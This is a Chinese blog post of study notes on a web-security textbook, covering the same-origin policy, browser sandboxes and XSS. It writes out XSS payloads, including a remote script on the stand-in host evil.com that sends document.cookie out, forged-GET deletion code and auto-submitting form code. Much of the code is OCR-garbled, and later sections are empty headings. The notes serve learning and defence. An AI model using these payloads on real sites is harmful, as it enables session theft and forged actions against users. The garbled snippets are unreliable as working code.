---
title: "白帽子web安全.md"
date: 2019-09-29 19:29:06 +0800
lastmod: 2019-09-29 19:29:06 +0800
draft: false
tags: [""]
categories: ["安全"]
author: "Claymore"

---


作者： 吴翰清

阿里安全人员



### 安全观

安全问题的本质是信任的问题。
一切的安全方案设计的基础,都是建立在信任关系上的。

举例来说,假设我们有份很重要的文件要好好保管起来,能想到的一个方案是把文件“锁
到抽屉里。

这里就包含了几个基本的假设,

* 首先,制作这把锁的工匠是可以信任的,他没有私自藏一把钥匙;

* 其次,制作抽屉的工匠没有私自给抽屉装一个后门

* 最后,钥匙还必须要保管在一个不会出问题的地方,或者交给值得信任的人保管。

反之,如果我们一切都不信任,那么也就不可能认为文件放在抽屉里是安全的



在解决安全问题的过程中,不可能一劳永逸,也就是说“没有银弹”。

安全是一个持续的过程。

很多安全厂商在推销自己产品时,会向用户展示一些很美好的蓝图,似乎他们的产品无所
不能,购买之后用户就可以睡得安稳了。

但实际上,安全产品本身也需要不断地升级,也需要有人来运营。

产品本身也需要一个新陈代谢的过程,否则就会被淘汰。在现代的互联网产品中,
自动升级功能已经成为一个标准配置,一个有活力的产品总是会不断地改进自身

#### 白帽子兵法

* 白名单、黑名单的思想。如果更多地使用白名单，系统会更安全。如

  * 防火墙。
  * XSS Filter,  只准许用户输入`<a>.<img>`的标签。

* 最小权限原则

* 纵深防御， 多方面考虑

  * 如xss防范： 过滤特殊符号 -> 区分富文本和非富文本 -> 对富文本开始语法树分析 -> 综合方案
  * 近几年安全厂商为了迎合市场的需要,推出了一种产品叫UTM,全称是“统一威胁管理
    ( Unified Threat Management)。UIM几乎集成了所有主流安全产品的功能,比如防火墙、VPN、反垃圾邮件、IDS、反病毒等。UTM的定位是当中小企业没有精力自己做安全方案时,可以在定程度上提高安全门槛.

* **数据与代码分离**

* 不可预测性

  微软使用的ASLR技术,在较新版本的 Linux内核中也支持。在ASLR的控制下,一个程
  序每次启动时,其进程的栈基址都不相同,具有一定的随机性,对于攻击者来说,这就是“不
  可预测性”



## 客户端脚本安全

### 浏览器安全

#### 同源策略

同源策略( Same Origin Policy)是一种约定, 为了不让浏览器的页面行为发生混乱,

浏览器提出了“ Origin”(源)这一概念,来自不同 Origin的对象无法互相干扰。



这一策略极其重要,试想如果没有同源策略,可能acom的一段 JavaScript.脚本,在bc
未曾加载此脚本时,也可以随意涂改bcom的页面(在浏览器的显示中)。



可以说web是构建在同源策略的基础之上的,浏览器只是针对同源策略的一种实现。

**浏览器的同源策略,限制了来自不同源的“ document”或脚本,对当前“ document”读
取或设置某些属性**

影响“源”的因素有:

host(域名或IP地址,如果是IP地址则看做个根域名)、子域名、端口、协议。

需要注意的是,对于当前页面来说,页面内存放 JavaScript文件的域并不重要,重要的是
加载 JavaScript页面所在的域是什么。
换言之,a.com通过以下代码:
`<script src=http://b.com/b.js></script>`
加载了b.com上的b.js,但是b.js是运行在a.com页面中的,

因此对于当前打开的页面(a.com页面)来说,

**bjs的 Origin就应该是acom而非bcom**
在浏览器中`< script>、<img、< iframe>、<ink>`等标签都可以跨域加载资源,而不受同
源策略的限制。它们这些带“src”属性的标签每次加载时,实际上是由浏览器发起了一次GET请求。

通过src属性加载的资源,浏览器限制了 JavaScript的权限使其不能读、写资源的内容。 

但对于 Xmlhttprequest，不能跨域访问资源,在AJAX应用的开发中尤其需要注意这一点 ,

它需要通过目标域返回的HTTP头来授权是否允许跨域访问,

**因为HTTP头对于JavaScript来说一般是无法控制的**,所以认为这个方案可以实施。
注意:这个跨域访问方案的安全基础就是信任“JavaScript无法控制该HTTP头”,如果此信任
基础被打破,则此方案也将不再安全



#### 浏览器沙箱

浏览器的多进程架构,将浏览器的各个功能模块分开,各个浏览器实例分开,当一个进程
崩溃时,也不会影响到其他的进程。

渲染引擎由 Sandbox隔离,网页代码要与浏览器内核进程通信、与操作系统通信都需要通
过 IPC channel,在其中会进行一些安全检查

而对于浏览器来说,采用 Sandbox技术,无疑可以让不受信任的网页代码、 JavaScript代
运行在一个受到限制的环境中,从而保护本地桌面系统的安全



#### 恶意网址拦截

这种在网页中插入一段恶意代码,利用浏览器漏洞执行任意代码的攻击方式,在黑客圈子
里被形象地称为“挂马”。

“挂马”攻击在实施时会在一个正常的网页中通过`<scip>或者<fame>`等标签加载一个恶意网址。而除了挂马所加载的恶意网址之外,钓鱼网站、诈骗网站对于用户来说也是一种恶意网址。

为了保护用户安全浏览器厂商纷纷推出了各自的拦截恶意网址功能。

目前各个**浏览器的拦截恶意网址的功能都是基于“黑名单”**的。
恶意网址拦截的工作原理很简单,一般都是浏览器周期性地从服务器端获取一份最新的恶
意网址黑名单,如果用户上网时访问的网址存在于此黑名单中,浏览器就会弹出一个警告页面。

PhishTank是互联网上免费提供恶意网址黑名单的组织之一,它的黑名单由世界各地的志
愿者提供,且更新频繁

除了恶意网址黑名单拦截功能外,主流浏览器都开始支持 EV SSL证书( Extended Validation
SSL Certificate),以增强对安全网站的识别。
EVSSL证书是全球数字证书颁发机构与浏览器厂商一起打造的增强型证书,其主要特色是
浏览器会给予 EVSSL证书特殊待遇。

在网页的证书信息中会显示绿色



### 跨站脚本攻击（xss）

XSS攻击,通常指黑客通过“HTML注入”篡改了网页,插入了恶意的脚本,从而在用户
浏览网页时,控制用户浏览器的一种攻击。在一开始,这种攻击的演示案例是跨域的,所以叫
做“跨站脚本”。

但是发展到今天,由于 Javascript I的强大功能以及网站前端应用的复杂化,**是否跨域已经不再重要**。但是由于历史原因,XSS这个名字却一直保留下来

`cross-site-scripting`   为了区别css,我们为它称之为xss.

钓鱼攻击： url中嵌入前端语句，模拟用户登录输入框，为了不显眼，可以将伪造的url编码。

获取cookie  :   url后 或输入框可加入：`<scirpt>alert(document.cookie)</scripte>`等来获取。



#### 存储型

嵌入到web页面的恶意HTML会被存储到应用服务器端，简而言之就是会被存储到数据库，等用户在打开页面时，会继续执行恶意代码，能够持续的攻击用户。

比如一些输入框， 输入后可以录入数据库，并会显示在前端。

这里我们可以输入一些js脚本：`<script> alert(1) </script>`

如果没有校验就录入数据库，那么当再次打开该页面时，就会弹出1.



#### 反射型

反射型XSS是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的；

如一些接口`ip/api/test/<id>?a='d'` 这里的 id和a都是变量 ，如果该接口没有做 校验，输入会在返回值中，

那么我们在test后接入：

`<img src="1" onerror="alert(1)">`

或`<img src"1" onerror="prompt()">`  ,prompt() 方法用于显示可提示用户进行输入的对话框。

这样后端返回的数据就是我们刚才输入的，可以直接在前端渲染。



这样看来存储型的注入危害更大。



#### XSS  Payload

XSS攻击成功后,攻击者能够对用户当前浏览的页面植入恶意脚本,通过恶意脚本,控制
用户的浏览器。

这些用以完成各种具体功能的恶意脚本,被称为“ XSS Payload”
XSS Pay load实际上就是 JavaScript脚本(还可以是 Flash或其他富客户端的脚本),所以
任何 JavaScript脚本能实现的功能, XSS Payload都能做到。
最常见的 XSS Payload,就是通过读取浏览器的 Cookie对象,从而发起“ Cookie劫持”攻击



##### 远程脚本

`http://www,a.com/test.htm?abc"><script src=http://www.evil.com/evil.js></script>`

真正的 XSS Payload写在这个远程脚本中,避免直接在URL的参数里写入大量的 JavaScript
在 evil,js中,可以通过如下代码窃取 Cookie:

```
var img = document.createElement("img");
img.src = "http://www.evil.com/1og?" + escape(document.cookie);
document.body.appendChild(img);
```



这段代码在页面中插入了一张看不见的图片,同时把 document. cookie对象作为参数发送
到远程服务器
事实上,`htt/www.evil.com/log`并不一定要存在,因为这个请求会在远程服务器的web
日志中留下记录
`27.0,0,1--19/0u1/2010:11:30:42+08001"GE?/log? cookie193D1234Hrp/1.1“404288`
这样,就完成了一个最简单的窃取 Cookie的 XSS Payload

得到用户cookie就可以登录了。



Cookie的“ Httponly”标识可以防止“ Cookie劫持”,



Cookie劫持”并非所有的时候都会有效。有的网站可能会在 Set-Cookie时给关键 Cookie
植入 Httponly标识;

有的网站则可能会把 Cookie与客户端IP绑定,从而使得XSS窃取的 Cookie失去意义。



##### 仿造get请求

正常删除该文章的链接是:
`http://blog.sohucom/manage/entry.do?m=delete&id-156713012`
对于攻击者来说,只需要知道文章的id,就能够通过这个请求删除这篇文章了.
攻击者可以通过插入一张图片来发起一个GET请求:

```
var img = document.createElement(img");
img.src="http://blog.sohucom/manage/entry.do?m=deletesid=156713012";
document body. appendchild(img);
```



##### 模拟表单

要模拟这一过程,有两种方法。第一种方法是,构造一个fom表单,然后自动提交这个表单:

```js
var f= document.createElement ("form");
f.action = "";
f.method ="post";
document.body.appendChild(f)；

var il= document.createElement("input")
i1.name= "ck";
i1.value ="JiUY"
f appendchild(11);
var i2 document.createElement("input");
i2. name mb text":
i2. value="testtesttest
f appendchild(i2):
f, submit()冫
```

如果表单的参数很多的话,通过构造DOM节点的方式,代码将会非常冗长。所以可以直
接写HML代码,这样会使得整个代码精简很多,如下所示:

```
var dd = document.createElement("div");
document.body.appendChild(dd);
dd.innerHTML='<form action"" method="post" id="xssform" name="mbform">'+
 '<input type"hidden" value="JiUY" name="ck"/>' +
 '<input type="text" value="testtesttest" name="mb text"/>'+
 '</form>'

document. getElementById("xssform"). submit();
```

第二种方法是,通过 XmlhTtprequEst发送一个POST请求:



##### XXS 钓鱼

实现思路很简单:利用 JavaScript在当前页面上“画出”一个伪造的登录框,当用户在登
录框中输入用户名与密码后,其密码将被发送至黑客的服务器上。



##### 识别用户浏览器

如何通过 JavaScript脚本识别浏览器版本呢?最直接的莫过于通过XSs读取浏览器的
UserAgent对象
`alert (navigator. userAgent)；`



##### 识别用户软件



##### 获取用户真实地址

很多时候,用户电脑使用了代理服务器,或者在局域网中隐藏在NAT后面。

网站看到的客户端IP地址,是内网的出口IP地址,而并非用户电脑真实的本地IP地址。

JavaScript本身并没有提供获取本地IP地址的能力,有没有其他办法?

一般来说,XSS攻击需要借助第三方软件来完成。

比如,客户端安装了Java环境(JRE),那么XSS就可以通过调用 Java Applet的接口获取客户端的本地IP地址。



#### XSS Worm

XSS也能形成蠕虫吗?我们知道,以往的蠕虫是利用服务器端软件漏洞进行传播的。比如
2003年的冲击波蠕虫,利用的是 Windows的RPC远程溢出漏洞。

在2005年,年仅19岁的 Samy Kamkar发起了对 My Space. com的 XSS Worn攻击。虫在短短几小时内就感染了100万用户—它在每个用户的自我简介后边加了
句话:“ but most of all, Samy is my hero.”(Samy是我的偶像)。

这是Web安全史上第一个重量级的 XSS Worn,具有里程碑意义。

首先, MySpace过滤了很多危险的HTML标签,只保留了`<a>`标签、`<img>`标签、`<div>`标
签等“安全的标签”。所有的事件比如“ onclick”等也被过滤了。

但是 MySpace却允许用户控制标签的syle属性,通过 style,还是有办法构造出XSS的。比如

`<div style="background: url('javascript: alert(1)')">`



#### 构造技巧



#### XSS的防御

##### HttpOnly





### 跨站点请求伪造(CSRF)

CSRF的全名是 Cross Site Request Forgery,



### 点击劫持（ClickJacking）





### HTML5安全





### 注入攻击



### 文件上传漏洞





### 认证于会话管理



### 访问控制



### 加密算法与随机数



### Web框架安全



### 应用层拒绝服务攻击



### PHP攻击





### Web Server 配置安全

